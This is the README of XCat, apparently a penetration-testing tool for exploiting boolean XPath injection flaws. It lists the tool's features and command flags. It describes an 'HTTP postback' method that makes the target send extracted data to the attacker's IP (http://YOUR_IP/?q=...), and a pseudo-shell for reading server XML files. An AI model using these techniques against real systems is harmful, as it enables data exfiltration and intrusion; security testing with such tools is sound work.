XCat
====

XCat is a command line program that aides in the exploitation of XPath injection vulnerabilities.
It boasts a wide range of features and can utilize the more advanced features of the XPath 2.0 specification (pattern matching, unicode normilization and even http requests) or gracefully degrade to using XPath 1.0 if they are not available.

XCat is built to exploit boolean XPath injections (Where only one bit of data can be extracted in one request) and it requires you to manually identifiy the exploit first, this does not do that for you.

Features
--------
* Exploits both GET and POST attacks
* Extracts all nodes, comments, attributes and data from the entire XML document
* Small and lightweight (only dependency is [Twisted](http://www.twistedmatrix.com))
* Parallel requests
* XPath 2.0 supported (with graceful degrading to 1.0)
* [Regex](http://www.w3.org/TR/xpath-functions/#func-matches) pattern matching to reduce character search space
* [Unicode normalization](http://www.w3.org/TR/xpath-functions/#func-normalize-unicode)
* Advanced data postback through HTTP (see below)
* Arbitrarily read XML files on the servers file system via the doc() function (see below)

Usage
-----
	usage: xcat.py [-h] [--method {GET,POST}] [--arg POST_ARGUMENT]
                   [[--true TRUE_KEYWORD | --false FALSE_KEYWORD | --error ERROR_KEYWORD]
                   [--true-code TRUE_CODE | --false-code FAIL_CODE | --error-code ERROR_CODE]
                   [--schema-only] [--quotecharacter QUOTE_CHARACTER]
                   [--executequery EXECUTEQUERY] [--max_search SEARCH_LIMIT]
                   [--timeout TIMEOUT] [--stepsize STEP_SIZE]
                   [--normalize {NFD,NFC,NFDK,NFKC}] [--xversion {1,2,auto}]
                   [--lowercase] [--regex] [--connectback]
                   [--connectbackip CONNECTBACK_IP]
                   [--connectbackport CONNECTBACK_PORT]
                   [--notfoundstring NOTFOUNDCHAR] [--fileshell] [--getcwd]
                   [--useragent USER_AGENT] [--timeit]
                   URL

### Simple usage with the example application
Check out the [readme](xcat/blob/master/src/example_application) to try out XCat with the provided example application.

HTTP Postback / doc function
----------------------------
Possibly the most advanced feature of XCat is its 'HTTP postback' feature. The XPath 2.0 schema defines a function called [doc](http://www.w3.org/TR/xpath-functions/#func-doc) which allows the programmer to load external documents from the file system or even from a remote network resource via HTTP/HTTPS. If the doc function is enabled and working then XCat will use it where possible to greatly speed up document retrieval times. It does this by running a small HTTP server within the program which listens on a specified port and by then calling the doc() function with the currently targetted node's data URI encoded and appended to a query. This means the XPath library will make a HTTP request to your IP (requires the port to be forwarded and/or a public IP) in the following format:

	http://YOUR_IP/?q=some%20data%20goes%here

This is far more efficient than iterating over the string character by character and can greatly reduce the retrieval times.

You can (ab)use this function to load XML file on the system, as long as you have read permissions over it, allowing you to retrieve lots of lovely XML configuration files - you can jump into a pseudo-shell within XCat by using the --fileshell flag and enter any file path.
